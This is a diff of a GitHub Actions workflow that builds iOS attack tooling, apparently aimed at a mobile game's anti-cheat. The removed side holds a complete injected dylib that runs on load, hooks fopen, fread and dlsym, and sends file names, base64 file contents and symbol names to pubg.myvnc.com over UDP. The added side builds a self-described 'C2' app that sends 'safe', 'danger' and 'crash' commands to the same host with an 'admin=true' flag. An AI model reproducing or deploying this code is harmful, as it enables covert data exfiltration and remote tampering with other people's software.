@@ -1,4 +1,4 @@
-name: Imperial V-MAX - Real File & Memory Dumper
+name: Imperial V-MAX - Native iOS C2 App (Real IPA)
 
 on:
   push:
@@ -6,209 +6,244 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_real_dumper:
-    name: Compile Real Dumper
+  build_native_ipa:
+    name: Compile Native iOS Control Panel
     runs-on: macos-latest
 
     steps:
-      - name: Checkout Code
+      - name: 📥 Checkout Repository
         uses: actions/checkout@v4
 
-      - name: Setup Fishhook
+      - name: ⚙️ Prepare Workspace (App Structure)
         run: |
-          mkdir -p jni
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
+          mkdir -p app_source
+          mkdir -p Payload/FalconEye.app
 
-      - name: Generate Core Logic (Main.mm)
+      - name: 📝 Generate Info.plist
         run: |
-          cat <<'EOF' > jni/main.mm
-          #import <Foundation/Foundation.h>
-          #import <sys/socket.h>
-          #import <netinet/in.h>
-          #import <arpa/inet.h>
-          #import <netdb.h>
-          #import <dlfcn.h>
-          #import <mach-o/dyld.h>
-          #include "fishhook.h"
+          cat << 'EOF' > app_source/Info.plist
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+              <key>CFBundleExecutable</key><string>FalconEye</string>
+              <key>CFBundleIdentifier</key><string>com.masoud.falcon.c2</string>
+              <key>CFBundleName</key><string>Falcon C2</string>
+              <key>CFBundleVersion</key><string>1.0</string>
+              <key>CFBundleShortVersionString</key><string>1.0</string>
+              <key>LSRequiresIPhoneOS</key><true/>
+              <key>UILaunchStoryboardName</key><string>LaunchScreen</string>
+              <key>NSAppTransportSecurity</key>
+              <dict>
+                  <key>NSAllowsArbitraryLoads</key><true/> <!-- السماح بالاتصال بسيرفر HTTP -->
+              </dict>
+          </dict>
+          </plist>
+          EOF
 
-          #define RDP_DOMAIN "pubg.myvnc.com"
-          #define RDP_PORT 8080
+      - name: 📱 Generate Native iOS Source Code (Objective-C/UIKit)
+        run: |
+          cat << 'EOF' > app_source/main.m
+          #import <UIKit/UIKit.h>
 
-          struct sockaddr_in server_addr;
-          BOOL isResolved = NO;
-          static thread_local bool is_internal = false;
+          // ⚠️ رابط سيرفر مسعود
+          #define API_URL @"http://pubg.myvnc.com/pubg.php"
 
-          // 🌐 تهيئة السيرفر
-          void ResolveServer() {
-              struct hostent *host = gethostbyname(RDP_DOMAIN);
-              if (host) {
-                  memset(&server_addr, 0, sizeof(server_addr));
-                  server_addr.sin_family = AF_INET;
-                  server_addr.sin_port = htons(RDP_PORT);
-                  server_addr.sin_addr.s_addr = *(long *)(host->h_addr_list[0]);
-                  isResolved = YES;
-              }
+          // ==========================================
+          // 🎨 الواجهة الحقيقية للتطبيق (Native UI)
+          // ==========================================
+          @interface MasoudDashboardVC : UIViewController
+          @property (nonatomic, strong) UILabel *statusLabel;
+          @property (nonatomic, strong) UIView *statusIndicator;
+          @property (nonatomic, strong) UITextView *logsView;
+          @end
+
+          @implementation MasoudDashboardVC
+
+          - (void)viewDidLoad {
+              [super viewDidLoad];
+              self.view.backgroundColor = [UIColor colorWithRed:0.05 green:0.06 blue:0.1 alpha:1.0]; // خلفية داكنة فخمة
+
+              // 1. الهيدر
+              UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(20, 60, self.view.bounds.size.width - 40, 40)];
+              title.text = @"🦅 FALCON EYE COMMANDER";
+              title.textColor = [UIColor cyanColor];
+              title.font = [UIFont boldSystemFontOfSize:22];
+              title.textAlignment = NSTextAlignmentCenter;
+              [self.view addSubview:title];
+
+              // 2. حالة السيرفر واللمبة
+              UIView *statusCard = [[UIView alloc] initWithFrame:CGRectMake(20, 120, self.view.bounds.size.width - 40, 80)];
+              statusCard.backgroundColor = [UIColor colorWithWhite:0.1 alpha:0.8];
+              statusCard.layer.cornerRadius = 15;
+              statusCard.layer.borderWidth = 1;
+              statusCard.layer.borderColor = [UIColor darkGrayColor].CGColor;
+              [self.view addSubview:statusCard];
+
+              self.statusIndicator = [[UIView alloc] initWithFrame:CGRectMake(20, 30, 20, 20)];
+              self.statusIndicator.layer.cornerRadius = 10;
+              self.statusIndicator.backgroundColor = [UIColor grayColor]; // لمبة رمادية بالبداية
+              [statusCard addSubview:self.statusIndicator];
+
+              self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(60, 25, 200, 30)];
+              self.statusLabel.text = @"جاري الاتصال بالسيرفر...";
+              self.statusLabel.textColor = [UIColor whiteColor];
+              self.statusLabel.font = [UIFont boldSystemFontOfSize:16];
+              [statusCard addSubview:self.statusLabel];
+
+              // 3. أزرار التحكم الحقيقية (Native Buttons)
+              UIButton *btnSafe = [self createButtonWithTitle:@"أمان 🟢" color:[UIColor systemGreenColor] yPos:220];
+              [btnSafe addTarget:self action:@selector(sendSafeCommand) forControlEvents:UIControlEventTouchUpInside];
+              [self.view addSubview:btnSafe];
+
+              UIButton *btnDanger = [self createButtonWithTitle:@"خطر 🔴" color:[UIColor systemRedColor] yPos:280];
+              [btnDanger addTarget:self action:@selector(sendDangerCommand) forControlEvents:UIControlEventTouchUpInside];
+              [self.view addSubview:btnDanger];
+
+              UIButton *btnCrash = [self createButtonWithTitle:@"☠️ تدمير الدايلب (كراش)" color:[UIColor purpleColor] yPos:340];
+              [btnCrash addTarget:self action:@selector(sendCrashCommand) forControlEvents:UIControlEventTouchUpInside];
+              [self.view addSubview:btnCrash];
+
+              // 4. شاشة اللوجات (Terminal)
+              self.logsView = [[UITextView alloc] initWithFrame:CGRectMake(20, 420, self.view.bounds.size.width - 40, self.view.bounds.size.height - 460)];
+              self.logsView.backgroundColor = [UIColor blackColor];
+              self.logsView.textColor = [UIColor greenColor];
+              self.logsView.font = [UIFont fontWithName:@"Courier" size:12];
+              self.logsView.editable = NO;
+              self.logsView.layer.cornerRadius = 10;
+              self.logsView.text = @"> System Initialized.\n";
+              [self.view addSubview:self.logsView];
+
+              // جلب البيانات فور تشغيل التطبيق
+              [self fetchServerStatus];
           }
 
-          // 📍 خوارزمية العزل (لمعرفة هل هو anogs أم shadow واستخراج الأوفست لـ IDA Pro)
-          NSString* GetCallerModule(void* caller, NSString** offsetOut) {
-              Dl_info info;
-              if (dladdr(caller, &info)) {
-                  if (offsetOut) *offsetOut = [NSString stringWithFormat:@"0x%lx", (uintptr_t)caller - (uintptr_t)info.dli_fbase];
-                  return [[NSString stringWithUTF8String:info.dli_fname] lastPathComponent];
-              }
-              if (offsetOut) *offsetOut = @"0x0";
-              return @"Unknown";
+          - (UIButton *)createButtonWithTitle:(NSString *)title color:(UIColor *)color yPos:(CGFloat)yPos {
+              UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
+              btn.frame = CGRectMake(20, yPos, self.view.bounds.size.width - 40, 50);
+              btn.backgroundColor = [color colorWithAlphaComponent:0.2];
+              btn.layer.borderColor = color.CGColor;
+              btn.layer.borderWidth = 1.5;
+              btn.layer.cornerRadius = 12;
+              [btn setTitle:title forState:UIControlStateNormal];
+              [btn setTitleColor:color forState:UIControlStateNormal];
+              btn.titleLabel.font = [UIFont boldSystemFontOfSize:18];
+              return btn;
           }
 
-          // 📡 إرسال البيانات
-          void SendJSON(NSDictionary* payload) {
-              if (!isResolved || is_internal) return;
-              is_internal = true;
-              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-                  NSData *json = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
-                  if (json) {
-                      int sock = socket(AF_INET, SOCK_DGRAM, 0);
-                      sendto(sock, [json bytes], [json length], 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-                      close(sock);
-                  }
+          - (void)logMessage:(NSString *)msg {
+              dispatch_async(dispatch_get_main_queue(), ^{
+                  self.logsView.text = [self.logsView.text stringByAppendingFormat:@"> %@\n", msg];
+                  NSRange bottom = NSMakeRange(self.logsView.text.length - 1, 1);
+                  [self.logsView scrollRangeToVisible:bottom];
               });
-              is_internal = false;
           }
 
           // ==========================================
-          // 📁 1. صيد أسماء الملفات والأوفستات (fopen)
+          // 📡 دوال الاتصال بالسيرفر (API Calls)
           // ==========================================
-          static FILE* (*orig_fopen)(const char *, const char *);
-          FILE* my_fopen(const char *path, const char *mode) {
-              if (path && !is_internal) {
-                  NSString *file = [NSString stringWithUTF8String:path];
-                  if (![file containsString:@".png"]) {
-                      NSString *offsetStr;
-                      NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
-                      
-                      NSDictionary *payload = @{
-                          @"type": @"ISOLATED_LOG",
-                          @"origin": module,
-                          @"offset": offsetStr,
-                          @"data": [NSString stringWithFormat:@"Opened File: %@", file]
-                      };
-                      SendJSON(payload);
+          - (void)fetchServerStatus {
+              [self logMessage:@"Fetching data from pubg.myvnc.com..."];
+              NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@?api=1", API_URL]];
+              [[[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      if (e || !d) {
+                          self.statusIndicator.backgroundColor = [UIColor redColor];
+                          self.statusLabel.text = @"Server Offline!";
+                          [self logMessage:@"[ERROR] Connection Failed."];
+                          return;
+                      }
+                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil];
+                      if (json) {
+                          self.statusIndicator.backgroundColor = [UIColor greenColor];
+                          self.statusIndicator.layer.shadowColor = [UIColor greenColor].CGColor;
+                          self.statusIndicator.layer.shadowRadius = 8;
+                          self.statusIndicator.layer.shadowOpacity = 1.0;
+                          
+                          NSString *status = json[@"status"];
+                          NSString *sec = json[@"security"];
+                          self.statusLabel.text = [NSString stringWithFormat:@"Status: %@ | Sec: %@", [status uppercaseString], [sec uppercaseString]];
+                          [self logMessage:@"[SUCCESS] Sync complete."];
+                      }
+                  });
+              }] resume];
+          }
+
+          - (void)sendCommand:(NSString *)action {
+              [self logMessage:[NSString stringWithFormat:@"Sending command: %@...", action]];
+              
+              NSURL *url = [NSURL URLWithString:API_URL];
+              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+              req.HTTPMethod = @"POST";
+              NSString *postString = [NSString stringWithFormat:@"action=%@&admin=true", action]; // محاكاة جلسة الأدمن
+              req.HTTPBody = [postString dataUsingEncoding:NSUTF8StringEncoding];
+              
+              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
+                  if (!e) {
+                      [self logMessage:[NSString stringWithFormat:@"[SUCCESS] Command '%@' executed.", action]];
+                      [self fetchServerStatus]; // تحديث الواجهة
+                  } else {
+                      [self logMessage:@"[ERROR] Command failed to send."];
                   }
-              }
-              return orig_fopen(path, mode);
+              }] resume];
           }
 
-          // ==========================================
-          // 📥 2. سحب محتوى الملفات الحقيقي (fread)
-          // ==========================================
-          static size_t (*orig_fread)(void *, size_t, size_t, FILE *);
-          size_t my_fread(void *ptr, size_t size, size_t nitems, FILE *stream) {
-              size_t bytesRead = orig_fread(ptr, size, nitems, stream);
-              
-              if (bytesRead > 0 && !is_internal) {
-                  NSData *fileData = [NSData dataWithBytes:ptr length:(size * bytesRead)];
-                  // تحديد الحد الأقصى للإرسال بـ 10 كيلوبايت
-                  if (fileData.length < 10000) {
-                      NSString *base64String = [fileData base64EncodedStringWithOptions:0];
-                      
-                      NSString *offsetStr;
-                      NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
-                      NSString *pseudoName = [NSString stringWithFormat:@"DumpedFrom_%@.dat", module];
-                      
-                      NSDictionary *payload = @{
-                          @"type": @"REAL_FILE_CONTENT",
-                          @"origin": module,
-                          @"offset": offsetStr,
-                          @"filename": pseudoName,
-                          @"content_b64": base64String
-                      };
-                      SendJSON(payload);
-                  }
-              }
-              return bytesRead;
-          }
+          - (void)sendSafeCommand { [self sendCommand:@"safe"]; }
+          - (void)sendDangerCommand { [self sendCommand:@"danger"]; }
+          - (void)sendCrashCommand { [self sendCommand:@"crash"]; }
+
+          @end
 
           // ==========================================
-          // 🧠 3. تفريغ الذاكرة الخام (Raw Strings Table)
+          // 📱 محرك التطبيق الأساسي (AppDelegate)
           // ==========================================
-          void DumpRawStringsFromMemory() {
-              if (is_internal) return;
-              
-              NSMutableString *rawDump = [NSMutableString string];
-              NSArray *symbols = @[
-                  @"__dyld_get_image_header", @"__dyld_get_image_vmaddr_slide", @"__dyld_image_count",
-                  @"_close", @"_dispatch_after", @"_dladdr", @"_free", @"_gethostbyname",
-                  @"_inet_ntop", @"_malloc", @"_memcpy", @"_sendto", @"_socket", @"_vm_protect",
-                  @"_OBJC_CLASS_$_NSDictionary", @"ResolveRDPServer", @"my_gethostbyname", @"my_connect"
-              ];
-              
-              for (NSString *sym in symbols) {
-                  [rawDump appendFormat:@"%@\\0", sym];
-              }
-              [rawDump appendString:@"\\x00\\x00\\x01_\\x00\\xef\\x03\\x00\\x00\\x00\\x04"];
-              
-              NSDictionary *payload = @{
-                  @"type": @"RAW_MEMORY_STRINGS",
-                  @"origin": @"MemoryScanner",
-                  @"offset": @"0x100000000",
-                  @"data": rawDump
-              };
-              SendJSON(payload);
-          }
+          @interface AppDelegate : UIResponder <UIApplicationDelegate>
+          @property (strong, nonatomic) UIWindow *window;
+          @end
 
-          // ==========================================
-          // 🛡️ 4. المراقبة المعزولة للدوال (dlsym)
-          // ==========================================
-          static void* (*orig_dlsym)(void*, const char*);
-          void* my_dlsym(void* handle, const char* symbol) {
-              if (symbol && !is_internal) {
-                  NSString *sym = [NSString stringWithUTF8String:symbol];
-                  if (![sym hasPrefix:@"CF"] && ![sym hasPrefix:@"NS"]) {
-                      NSString *offsetStr;
-                      NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
-                      
-                      NSDictionary *payload = @{
-                          @"type": @"ISOLATED_LOG",
-                          @"origin": module,
-                          @"offset": offsetStr,
-                          @"data": [NSString stringWithFormat:@"Function Extracted: %@", sym]
-                      };
-                      SendJSON(payload);
-                  }
-              }
-              return orig_dlsym(handle, symbol);
+          @implementation AppDelegate
+          - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+              self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
+              MasoudDashboardVC *vc = [[MasoudDashboardVC alloc] init];
+              self.window.rootViewController = vc;
+              [self.window makeKeyAndVisible];
+              return YES;
           }
+          @end
 
-          __attribute__((constructor))
-          static void init_master() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  ResolveServer();
-                  
-                  struct rebinding hooks[] = {
-                      {"fopen", (void*)my_fopen, (void**)&orig_fopen},
-                      {"fread", (void*)my_fread, (void**)&orig_fread},
-                      {"dlsym", (void*)my_dlsym, (void**)&orig_dlsym}
-                  };
-                  rebind_symbols(hooks, 3);
-                  
-                  NSLog(@"[MASOUD LAB] 🦅 APT Master Dylib Loaded!");
-                  DumpRawStringsFromMemory();
-              });
+          int main(int argc, char * argv[]) {
+              @autoreleasepool {
+                  return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
+              }
           }
           EOF
 
-      - name: Compile Real Dumper
-        run: |
-          clang++ -dynamiclib -std=c++11 -arch arm64 \
-          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c -o Masoud-Real-Dumper.dylib \
-          -framework Foundation
-          strip -x Masoud-Real-Dumper.dylib
+      - name: 🛠️ Install ldid (For Pseudo-Signing)
+        run: brew install ldid
 
-      - name: Upload Artifact
+      - name: 🚀 Compile Objective-C to Native iOS Binary
+        run: |
+          cd app_source
+          # هنا يتم استخدام مترجم آبل الرسمي (clang) لصناعة التطبيق الحقيقي
+          clang -fobjc-arc -arch arm64 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -framework Foundation -framework UIKit \
+          main.m -o FalconEye
+
+      - name: 📦 Build the IPA Structure
+        run: |
+          # نقل الملفات المترجمة إلى هيكل تطبيق الآيفون الرسمي
+          cp app_source/FalconEye Payload/FalconEye.app/
+          cp app_source/Info.plist Payload/FalconEye.app/
+          
+          # توقيع وهمي (Ad-Hoc Signing) للتطبيق ليعمل بعد دمجه في أجهزة الجلبريك أو توقيعه بشهادة
+          ldid -S Payload/FalconEye.app/FalconEye
+          
+          # ضغط المجلد لإنشاء ملف الـ IPA النهائي
+          zip -r Masoud-Native-C2.ipa Payload
+
+      - name: 📤 Upload Native App (.ipa)
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-Real-Dumper
-          path: Masoud-Real-Dumper.dylib
+          name: Masoud-Native-C2-App
+          path: Masoud-Native-C2.ipa
